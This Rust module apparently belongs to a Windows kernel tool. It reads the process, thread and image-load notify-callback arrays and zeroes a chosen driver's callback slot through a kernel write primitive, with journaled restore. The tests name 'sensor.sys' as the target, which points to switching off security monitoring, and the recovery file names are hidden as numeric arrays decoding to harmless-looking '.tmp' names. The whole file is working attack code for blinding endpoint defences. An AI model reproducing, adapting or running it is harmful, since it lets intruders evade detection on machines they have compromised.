//! Process, thread, and image-load callback inventory and control.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{is_kernel_pointer, read_u32, read_u64, write_u32, write_u64, zero},
    kernel::{KERNEL_HEADER_BYTES, KernelContext, parse_image_identity},
    modules::SystemModules,
    output::Output,
    profiles::KernelField,
    recovery::{RecoveryError, RecoveryStore, checksum},
    session::KernelSession,
};
use core::fmt::Write;

const CALLBACK_SLOTS: usize = 64;
const CALLBACK_ARRAY_BYTES: usize = CALLBACK_SLOTS * 8;
const CALLBACK_BLOCK_BYTES: usize = 24;
const TARGET_NAME_BYTES: usize = 64;
const JOURNAL_BYTES: usize = 144;
const JOURNAL_MAGIC: u32 = 0x4c43_424b;
const JOURNAL_VERSION: u32 = 1;
const JOURNAL_NONCE: u64 = 0x314c_4342_4e52_4b00;

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum CallbackKind {
    Process,
    Thread,
    Image,
}

impl CallbackKind {
    const fn name(self) -> &'static str {
        match self {
            Self::Process => "process",
            Self::Thread => "thread",
            Self::Image => "image-load",
        }
    }

    const fn field(self) -> KernelField {
        match self {
            Self::Process => KernelField::ProcessCallbackArrayRva,
            Self::Thread => KernelField::ThreadCallbackArrayRva,
            Self::Image => KernelField::ImageCallbackArrayRva,
        }
    }

    const fn id(self) -> u32 {
        match self {
            Self::Process => 1,
            Self::Thread => 2,
            Self::Image => 3,
        }
    }

    const fn recovery_name(self) -> &'static [u16] {
        const PROCESS: &[u16] = &[99, 97, 99, 104, 101, 65, 55, 67, 52, 46, 116, 109, 112, 0];
        const THREAD: &[u16] = &[99, 97, 99, 104, 101, 49, 57, 69, 50, 46, 116, 109, 112, 0];
        const IMAGE: &[u16] = &[99, 97, 99, 104, 101, 68, 54, 51, 66, 46, 116, 109, 112, 0];

        match self {
            Self::Process => PROCESS,
            Self::Thread => THREAD,
            Self::Image => IMAGE,
        }
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum CallbackAction {
    List,
    Disable(TargetSpec),
    Cycle(TargetSpec),
    Restore,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub struct TargetSpec {
    name: [u8; TARGET_NAME_BYTES],
    name_length: u8,
    rva: u32,
}

impl TargetSpec {
    pub fn new(name: &str, rva: u32) -> Option<Self> {
        if name.is_empty()
            || name.len() >= TARGET_NAME_BYTES
            || !name.bytes().all(valid_name_byte)
            || rva == 0
        {
            return None;
        }

        let mut output = Self {
            name: [0; TARGET_NAME_BYTES],
            name_length: name.len() as u8,
            rva,
        };
        output.name[..name.len()].copy_from_slice(name.as_bytes());

        Some(output)
    }

    fn name(&self) -> &[u8] {
        &self.name[..self.name_length as usize]
    }

    fn display_name(&self) -> &str {
        core::str::from_utf8(self.name()).unwrap_or("unknown")
    }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CallbackJournal {
    kind: CallbackKind,
    slot: u32,
    kernel_timestamp: u32,
    kernel_checksum: u32,
    kernel_image_size: u32,
    target_timestamp: u32,
    target_checksum: u32,
    target_image_size: u32,
    target: TargetSpec,
    original_fast_ref: u64,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CallbackEntry {
    slot: usize,
    fast_ref: u64,
    function: u64,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CallbackSnapshot {
    count: usize,
    fingerprint: u64,
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct CallbackError {
    stage: &'static str,
    code: u32,
}

pub fn run<A: KernelAdapter>(
    adapter: &mut A,
    kind: CallbackKind,
    action: CallbackAction,
    output: &mut Output,
) {
    match action {
        CallbackAction::List => inventory(adapter, kind, output),
        CallbackAction::Disable(target) | CallbackAction::Cycle(target) => {
            change(adapter, kind, action, target, output)
        }
        CallbackAction::Restore => restore(adapter, kind, output),
    }
}

fn inventory<A: KernelAdapter>(adapter: &mut A, kind: CallbackKind, output: &mut Output) {
    const REQUIRED: Capabilities = Capabilities::from_bits(Capability::KernelRead as u32);

    let _ = writeln!(output, "[*] Enumerating {} kernel callbacks", kind.name());
    let mut session = match KernelSession::open(adapter, REQUIRED, 0) {
        Ok(session) => session,
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] Callback inventory failed at {} (0x{:08x}); cleanup={}",
                error.stage,
                error.code,
                complete_failed(error.cleanup_succeeded)
            );
            return;
        }
    };
    let (adapter, modules, kernel, _) = session.parts();
    let first = walk(adapter, modules, kernel, kind, true, output);
    let second = walk(adapter, modules, kernel, kind, false, output);
    let close = session.close();

    match (first, second, close) {
        (Ok(first), Ok(second), Ok(())) if first == second => {
            let _ = writeln!(
                output,
                "[+] {} callback inventory complete; callbacks={}; state stable; no changes made",
                kind.name(),
                first.count
            );
        }
        (Ok(_), Ok(_), Ok(())) => {
            output.line("[-] Callback inventory changed during the repeat read; run it again");
        }
        (Err(error), _, _) | (_, Err(error), _) => {
            let _ = writeln!(
                output,
                "[-] Callback inventory failed at {} (0x{:08x})",
                error.stage, error.code
            );
        }
        (_, _, Err(error)) => {
            let _ = writeln!(
                output,
                "[-] Adapter close failed: {} (0x{:08x})",
                error.message(),
                error.code()
            );
        }
    }
}

fn walk<A: KernelAdapter>(
    adapter: &mut A,
    modules: &SystemModules,
    kernel: KernelContext,
    kind: CallbackKind,
    emit: bool,
    output: &mut Output,
) -> Result<CallbackSnapshot, CallbackError> {
    let array_rva = kernel.profile.value(kind.field());

    if array_rva == 0
        || (array_rva as u64)
            .checked_add(CALLBACK_ARRAY_BYTES as u64)
            .is_none_or(|end| end > kernel.profile.value(KernelField::ImageSize) as u64)
    {
        return Err(callback_error("callback-profile", 50));
    }

    let array_address = kernel
        .base
        .checked_add(array_rva as u64)
        .filter(|address| is_kernel_pointer(*address))
        .ok_or(callback_error("callback-array-address", 487))?;
    let mut array = [0_u8; CALLBACK_ARRAY_BYTES];
    adapter
        .read_kernel(array_address, &mut array)
        .map_err(|error| callback_error("callback-array-read", error.code()))?;
    let mut count = 0;
    let mut fingerprint = 0xcbf2_9ce4_8422_2325_u64;

    for slot in 0..CALLBACK_SLOTS {
        let entry = parse_entry(adapter, &array, slot)?;
        let Some(entry) = entry else {
            continue;
        };
        let owner = modules
            .owner(entry.function)
            .ok_or(callback_error("callback-attribution", 1168))?;
        let module_name = owner
            .basename()
            .and_then(|name| core::str::from_utf8(name).ok())
            .filter(|name| name.bytes().all(|byte| (0x20..=0x7e).contains(&byte)))
            .unwrap_or("unknown");
        let rva = entry
            .function
            .checked_sub(owner.base())
            .filter(|value| *value <= u32::MAX as u64)
            .ok_or(callback_error("callback-rva", 13))? as u32;
        fingerprint = mix_u64(fingerprint, entry.fast_ref);
        fingerprint = mix_u64(fingerprint, entry.function);
        count += 1;

        if emit {
            let _ = writeln!(
                output,
                "[*] Callback         : slot={} module={} rva=0x{:08x}",
                entry.slot, module_name, rva
            );
        }
    }

    zero(&mut array);

    Ok(CallbackSnapshot { count, fingerprint })
}

fn parse_entry<A: KernelAdapter>(
    adapter: &mut A,
    array: &[u8; CALLBACK_ARRAY_BYTES],
    slot: usize,
) -> Result<Option<CallbackEntry>, CallbackError> {
    let fast_ref = read_u64(array, slot * 8).ok_or(callback_error("callback-slot", 13))?;

    if fast_ref == 0 {
        return Ok(None);
    }

    let block = fast_ref & !15;

    if !is_kernel_pointer(block) || block & 15 != 0 {
        return Err(callback_error("callback-block-address", 13));
    }

    let mut bytes = [0_u8; CALLBACK_BLOCK_BYTES];
    adapter
        .read_kernel(block, &mut bytes)
        .map_err(|error| callback_error("callback-block-read", error.code()))?;
    let function = read_u64(&bytes, 8).ok_or(callback_error("callback-block", 13))?;
    zero(&mut bytes);

    if !is_kernel_pointer(function) {
        return Err(callback_error("callback-function", 13));
    }

    Ok(Some(CallbackEntry {
        slot,
        fast_ref,
        function,
    }))
}

fn mix_u64(mut hash: u64, mut value: u64) -> u64 {
    for _ in 0..8 {
        hash ^= value & 0xff;
        hash = hash.wrapping_mul(0x1000_0000_01b3);
        value >>= 8;
    }

    hash
}

const fn callback_error(stage: &'static str, code: u32) -> CallbackError {
    CallbackError { stage, code }
}

const fn complete_failed(value: bool) -> &'static str {
    if value { "complete" } else { "failed" }
}

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
struct ControlError {
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
}

fn change<A: KernelAdapter>(
    adapter: &mut A,
    kind: CallbackKind,
    action: CallbackAction,
    target: TargetSpec,
    output: &mut Output,
) {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);

    let verb = if matches!(action, CallbackAction::Cycle(_)) {
        "Cycling"
    } else {
        "Disabling"
    };
    let _ = writeln!(
        output,
        "[*] {verb} exact {} callback {}+0x{:08x}",
        kind.name(),
        target.display_name(),
        target.rva
    );
    let mut session = match KernelSession::open(adapter, REQUIRED, 8) {
        Ok(session) => session,
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] Callback action failed at {} (0x{:08x}); cleanup={}",
                error.stage,
                error.code,
                complete_failed(error.cleanup_succeeded)
            );
            return;
        }
    };
    let (adapter, modules, kernel, _) = session.parts();
    let result = change_opened(adapter, modules, kernel, kind, action, target, output);
    let close = session.close();

    if let Err(error) = result {
        print_control_error(output, error);
    }

    if let Err(error) = close {
        let _ = writeln!(
            output,
            "[-] Adapter close failed: {} (0x{:08x})",
            error.message(),
            error.code()
        );
        return;
    }

    if result.is_ok() {
        output.line(if matches!(action, CallbackAction::Cycle(_)) {
            "[+] Callback cycle complete; original slot restored"
        } else {
            "[+] Callback disabled; run the matching callback restore command when finished"
        });
    }
}

fn change_opened<A: KernelAdapter>(
    adapter: &mut A,
    modules: &SystemModules,
    kernel: KernelContext,
    kind: CallbackKind,
    action: CallbackAction,
    target: TargetSpec,
    output: &mut Output,
) -> Result<(), ControlError> {
    let module =
        modules
            .find(target.name())
            .ok_or(control_error("target-module", 126, false, false))?;
    let identity = read_module_identity(adapter, module.base())?;

    if identity.image_size != module.image_size()
        || target.rva >= identity.image_size
        || !is_kernel_pointer(module.base() + target.rva as u64)
    {
        return Err(control_error("target-identity", 13, false, false));
    }

    let array = callback_array(kernel, kind)?;
    let (slot, fast_ref) = find_exact(adapter, modules, array, module.base(), target.rva)?;
    let journal = CallbackJournal {
        kind,
        slot: slot as u32,
        kernel_timestamp: kernel.profile.value(KernelField::PeTimestamp),
        kernel_checksum: kernel.profile.value(KernelField::PeChecksum),
        kernel_image_size: kernel.profile.value(KernelField::ImageSize),
        target_timestamp: identity.timestamp,
        target_checksum: identity.checksum,
        target_image_size: identity.image_size,
        target,
        original_fast_ref: fast_ref,
    };
    let mut record = journal.encode();
    RecoveryStore::write_new(kind.recovery_name(), &record)
        .map_err(|error| recovery_control_error(error, false, false))?;
    output.line("[*] Recovery         : exact slot record created and flushed");
    let slot_address = array + (slot * 8) as u64;
    let write = adapter.write_kernel(slot_address, &[0; 8]);
    let observed = read_u64_at(adapter, slot_address);
    let saved_valid = validate_saved(adapter, modules, module.base(), target.rva, fast_ref);

    if write.is_err() || observed != Ok(0) || saved_valid.is_err() {
        let rollback = restore_slot(adapter, slot_address, fast_ref);

        if rollback {
            let _ = RecoveryStore::delete(kind.recovery_name());
        }

        let code = write
            .err()
            .map(|error| error.code())
            .or_else(|| observed.err().map(|error| error.code))
            .or_else(|| saved_valid.err().map(|error| error.code))
            .unwrap_or(13);
        zero(&mut record);
        return Err(control_error(
            "callback-disable-readback",
            code,
            rollback,
            !rollback,
        ));
    }

    let _ = writeln!(
        output,
        "[*] Disabled         : kind={} slot={} exact zero verified; callback block intact",
        kind.name(),
        slot
    );

    if matches!(action, CallbackAction::Cycle(_)) {
        if !restore_slot(adapter, slot_address, fast_ref) {
            zero(&mut record);
            return Err(control_error("callback-cycle-restore", 13, false, true));
        }

        RecoveryStore::delete(kind.recovery_name())
            .map_err(|error| recovery_control_error(error, true, true))?;
        output.line("[*] Restored         : exact fast reference written back and verified");
    }

    zero(&mut record);

    Ok(())
}

fn restore<A: KernelAdapter>(adapter: &mut A, kind: CallbackKind, output: &mut Output) {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::KernelWrite as u32);

    let _ = writeln!(output, "[*] Restoring exact {} callback", kind.name());
    let mut record = [0_u8; JOURNAL_BYTES];
    let journal = match RecoveryStore::read_exact(kind.recovery_name(), &mut record)
        .map_err(|error| recovery_control_error(error, false, true))
        .and_then(|_| {
            CallbackJournal::decode(&record, kind).ok_or(control_error(
                "recovery-integrity",
                13,
                false,
                true,
            ))
        }) {
        Ok(journal) => journal,
        Err(error) => {
            zero(&mut record);
            print_control_error(output, error);
            return;
        }
    };
    zero(&mut record);
    let mut session = match KernelSession::open(adapter, REQUIRED, 8) {
        Ok(session) => session,
        Err(error) => {
            let _ = writeln!(
                output,
                "[-] Callback restore failed at {} (0x{:08x}); recovery-retained=yes",
                error.stage, error.code
            );
            return;
        }
    };
    let (adapter, modules, kernel, _) = session.parts();
    let result = restore_opened(adapter, modules, kernel, journal, output);
    let close = session.close();

    if let Err(error) = result {
        print_control_error(output, error);
    }

    if let Err(error) = close {
        let _ = writeln!(
            output,
            "[-] Adapter close failed: {} (0x{:08x})",
            error.message(),
            error.code()
        );
        return;
    }

    if result.is_ok() {
        output.line("[+] Callback restored; exact readback verified and recovery record removed");
    }
}

fn restore_opened<A: KernelAdapter>(
    adapter: &mut A,
    modules: &SystemModules,
    kernel: KernelContext,
    journal: CallbackJournal,
    output: &mut Output,
) -> Result<(), ControlError> {
    if !journal.matches_kernel(kernel) {
        return Err(control_error("recovery-profile", 13, false, true));
    }

    let module = modules.find(journal.target.name()).ok_or(control_error(
        "target-module",
        126,
        false,
        true,
    ))?;
    let identity = read_module_identity(adapter, module.base())?;

    if identity.timestamp != journal.target_timestamp
        || identity.checksum != journal.target_checksum
        || identity.image_size != journal.target_image_size
        || module.image_size() != journal.target_image_size
    {
        return Err(control_error("target-identity", 13, false, true));
    }

    validate_saved(
        adapter,
        modules,
        module.base(),
        journal.target.rva,
        journal.original_fast_ref,
    )?;
    let array = callback_array(kernel, journal.kind)?;
    let slot_address = array + journal.slot as u64 * 8;

    if read_u64_at(adapter, slot_address)? != 0 {
        return Err(control_error("exact-disabled-state", 13, false, true));
    }

    if !restore_slot(adapter, slot_address, journal.original_fast_ref) {
        return Err(control_error("callback-restore-readback", 13, false, true));
    }

    RecoveryStore::delete(journal.kind.recovery_name())
        .map_err(|error| recovery_control_error(error, true, true))?;
    let _ = writeln!(
        output,
        "[*] Restored         : kind={} slot={} module={} rva=0x{:08x}",
        journal.kind.name(),
        journal.slot,
        journal.target.display_name(),
        journal.target.rva
    );

    Ok(())
}

fn callback_array(kernel: KernelContext, kind: CallbackKind) -> Result<u64, ControlError> {
    let rva = kernel.profile.value(kind.field());

    if rva == 0
        || (rva as u64)
            .checked_add(CALLBACK_ARRAY_BYTES as u64)
            .is_none_or(|end| end > kernel.profile.value(KernelField::ImageSize) as u64)
    {
        return Err(control_error("callback-profile", 50, false, false));
    }

    kernel
        .base
        .checked_add(rva as u64)
        .filter(|address| is_kernel_pointer(*address))
        .ok_or(control_error("callback-array-address", 487, false, false))
}

fn find_exact<A: KernelAdapter>(
    adapter: &mut A,
    modules: &SystemModules,
    array_address: u64,
    target_base: u64,
    target_rva: u32,
) -> Result<(usize, u64), ControlError> {
    let mut array = [0_u8; CALLBACK_ARRAY_BYTES];
    adapter
        .read_kernel(array_address, &mut array)
        .map_err(|error| control_error("callback-array-read", error.code(), false, false))?;
    let expected = target_base + target_rva as u64;
    let mut match_slot = 0;
    let mut match_fast_ref = 0;
    let mut matches = 0;

    for slot in 0..CALLBACK_SLOTS {
        let Some(entry) = parse_entry(adapter, &array, slot)
            .map_err(|error| control_error(error.stage, error.code, false, false))?
        else {
            continue;
        };

        if entry.function == expected
            && modules
                .owner(entry.function)
                .is_some_and(|owner| owner.base() == target_base)
        {
            match_slot = slot;
            match_fast_ref = entry.fast_ref;
            matches += 1;
        }
    }

    zero(&mut array);

    if matches != 1 {
        return Err(control_error("target-callback-unique", 13, false, false));
    }

    validate_saved(adapter, modules, target_base, target_rva, match_fast_ref)?;

    Ok((match_slot, match_fast_ref))
}

fn validate_saved<A: KernelAdapter>(
    adapter: &mut A,
    modules: &SystemModules,
    target_base: u64,
    target_rva: u32,
    fast_ref: u64,
) -> Result<(), ControlError> {
    let block = fast_ref & !15;

    if fast_ref == 0 || !is_kernel_pointer(block) || block & 15 != 0 {
        return Err(control_error("saved-fast-ref", 13, false, true));
    }

    let mut bytes = [0_u8; CALLBACK_BLOCK_BYTES];
    adapter
        .read_kernel(block, &mut bytes)
        .map_err(|error| control_error("saved-callback-block-read", error.code(), false, true))?;
    let function = read_u64(&bytes, 8).unwrap_or(0);
    zero(&mut bytes);

    if function != target_base + target_rva as u64
        || !modules
            .owner(function)
            .is_some_and(|owner| owner.base() == target_base)
    {
        return Err(control_error("saved-callback-identity", 13, false, true));
    }

    Ok(())
}

fn read_module_identity<A: KernelAdapter>(
    adapter: &mut A,
    base: u64,
) -> Result<crate::kernel::ImageIdentity, ControlError> {
    let mut headers = [0_u8; KERNEL_HEADER_BYTES];
    adapter
        .read_kernel(base, &mut headers)
        .map_err(|error| control_error("target-header-read", error.code(), false, false))?;
    let identity =
        parse_image_identity(&headers).ok_or(control_error("target-header", 193, false, false));
    zero(&mut headers);

    identity
}

fn read_u64_at<A: KernelAdapter>(adapter: &mut A, address: u64) -> Result<u64, ControlError> {
    let mut bytes = [0_u8; 8];
    adapter
        .read_kernel(address, &mut bytes)
        .map_err(|error| control_error("callback-slot-read", error.code(), false, true))?;
    let value =
        read_u64(&bytes, 0).ok_or(control_error("callback-slot-readback", 13, false, true))?;
    zero(&mut bytes);

    Ok(value)
}

fn restore_slot<A: KernelAdapter>(adapter: &mut A, address: u64, fast_ref: u64) -> bool {
    let bytes = fast_ref.to_le_bytes();

    for _ in 0..3 {
        if adapter.write_kernel(address, &bytes).is_ok()
            && read_u64_at(adapter, address).is_ok_and(|observed| observed == fast_ref)
        {
            return true;
        }
    }

    false
}

impl CallbackJournal {
    fn encode(self) -> [u8; JOURNAL_BYTES] {
        let mut output = [0_u8; JOURNAL_BYTES];
        write_u32(&mut output, 0, JOURNAL_MAGIC);
        write_u32(&mut output, 4, JOURNAL_VERSION);
        write_u32(&mut output, 8, JOURNAL_BYTES as u32);
        write_u32(&mut output, 12, self.kind.id());
        write_u32(&mut output, 16, self.slot);
        write_u32(&mut output, 20, self.kernel_timestamp);
        write_u32(&mut output, 24, self.kernel_checksum);
        write_u32(&mut output, 28, self.kernel_image_size);
        write_u32(&mut output, 32, self.target_timestamp);
        write_u32(&mut output, 36, self.target_checksum);
        write_u32(&mut output, 40, self.target_image_size);
        write_u32(&mut output, 44, self.target.rva);
        write_u64(&mut output, 48, self.original_fast_ref);
        write_u32(&mut output, 56, self.target.name_length as u32);
        output[64..128].copy_from_slice(&self.target.name);
        write_u64(&mut output, 128, JOURNAL_NONCE ^ self.kind.id() as u64);
        let integrity = checksum(&output[..136]);
        write_u64(&mut output, 136, integrity);

        output
    }

    fn decode(input: &[u8; JOURNAL_BYTES], expected_kind: CallbackKind) -> Option<Self> {
        if read_u32(input, 0)? != JOURNAL_MAGIC
            || read_u32(input, 4)? != JOURNAL_VERSION
            || read_u32(input, 8)? != JOURNAL_BYTES as u32
            || read_u32(input, 12)? != expected_kind.id()
            || read_u64(input, 128)? != JOURNAL_NONCE ^ expected_kind.id() as u64
            || read_u64(input, 136)? != checksum(&input[..136])
        {
            return None;
        }

        let name_length = read_u32(input, 56)? as usize;

        if name_length == 0
            || name_length >= TARGET_NAME_BYTES
            || !input[64..64 + name_length]
                .iter()
                .copied()
                .all(valid_name_byte)
        {
            return None;
        }

        let mut name = [0_u8; TARGET_NAME_BYTES];
        name.copy_from_slice(&input[64..128]);
        let target = TargetSpec {
            name,
            name_length: name_length as u8,
            rva: read_u32(input, 44)?,
        };
        let journal = Self {
            kind: expected_kind,
            slot: read_u32(input, 16)?,
            kernel_timestamp: read_u32(input, 20)?,
            kernel_checksum: read_u32(input, 24)?,
            kernel_image_size: read_u32(input, 28)?,
            target_timestamp: read_u32(input, 32)?,
            target_checksum: read_u32(input, 36)?,
            target_image_size: read_u32(input, 40)?,
            target,
            original_fast_ref: read_u64(input, 48)?,
        };

        if journal.slot as usize >= CALLBACK_SLOTS
            || journal.target.rva == 0
            || journal.target_timestamp == 0
            || journal.target_checksum == 0
            || journal.target_image_size == 0
            || journal.original_fast_ref == 0
            || !is_kernel_pointer(journal.original_fast_ref & !15)
        {
            return None;
        }

        Some(journal)
    }

    fn matches_kernel(self, kernel: KernelContext) -> bool {
        self.kernel_timestamp == kernel.profile.value(KernelField::PeTimestamp)
            && self.kernel_checksum == kernel.profile.value(KernelField::PeChecksum)
            && self.kernel_image_size == kernel.profile.value(KernelField::ImageSize)
    }
}

const fn valid_name_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'_' | b'-')
}

const fn control_error(
    stage: &'static str,
    code: u32,
    rollback: bool,
    recovery_retained: bool,
) -> ControlError {
    ControlError {
        stage,
        code,
        rollback,
        recovery_retained,
    }
}

const fn recovery_control_error(
    error: RecoveryError,
    rollback: bool,
    recovery_retained: bool,
) -> ControlError {
    control_error(error.stage(), error.code(), rollback, recovery_retained)
}

fn print_control_error(output: &mut Output, error: ControlError) {
    let _ = writeln!(
        output,
        "[-] Callback action failed at {} (0x{:08x}); rollback={}; recovery-retained={}",
        error.stage,
        error.code,
        yes_no(error.rollback),
        yes_no(error.recovery_retained)
    );
}

const fn yes_no(value: bool) -> &'static str {
    if value { "yes" } else { "no" }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn maps_callback_kinds_to_exact_profile_fields() {
        assert_eq!(
            CallbackKind::Process.field(),
            KernelField::ProcessCallbackArrayRva
        );
        assert_eq!(
            CallbackKind::Thread.field(),
            KernelField::ThreadCallbackArrayRva
        );
        assert_eq!(
            CallbackKind::Image.field(),
            KernelField::ImageCallbackArrayRva
        );
    }

    #[test]
    fn fingerprint_is_order_sensitive() {
        let first = mix_u64(mix_u64(1, 2), 3);
        let second = mix_u64(mix_u64(1, 3), 2);

        assert_ne!(first, second);
    }

    #[test]
    fn target_spec_rejects_paths_and_zero_rva() {
        assert!(TargetSpec::new("sensor.sys", 0x1234).is_some());
        assert!(TargetSpec::new("C:\\sensor.sys", 0x1234).is_none());
        assert!(TargetSpec::new("sensor.sys", 0).is_none());
    }

    #[test]
    fn journal_rejects_tampering() {
        let target = TargetSpec::new("sensor.sys", 0x1234).unwrap();
        let journal = CallbackJournal {
            kind: CallbackKind::Process,
            slot: 3,
            kernel_timestamp: 1,
            kernel_checksum: 2,
            kernel_image_size: 3,
            target_timestamp: 4,
            target_checksum: 5,
            target_image_size: 6,
            target,
            original_fast_ref: 0xffff_8000_0000_0013,
        };
        let mut record = journal.encode();

        assert_eq!(
            CallbackJournal::decode(&record, CallbackKind::Process),
            Some(journal)
        );
        record[20] ^= 1;
        assert_eq!(
            CallbackJournal::decode(&record, CallbackKind::Process),
            None
        );
    }
}
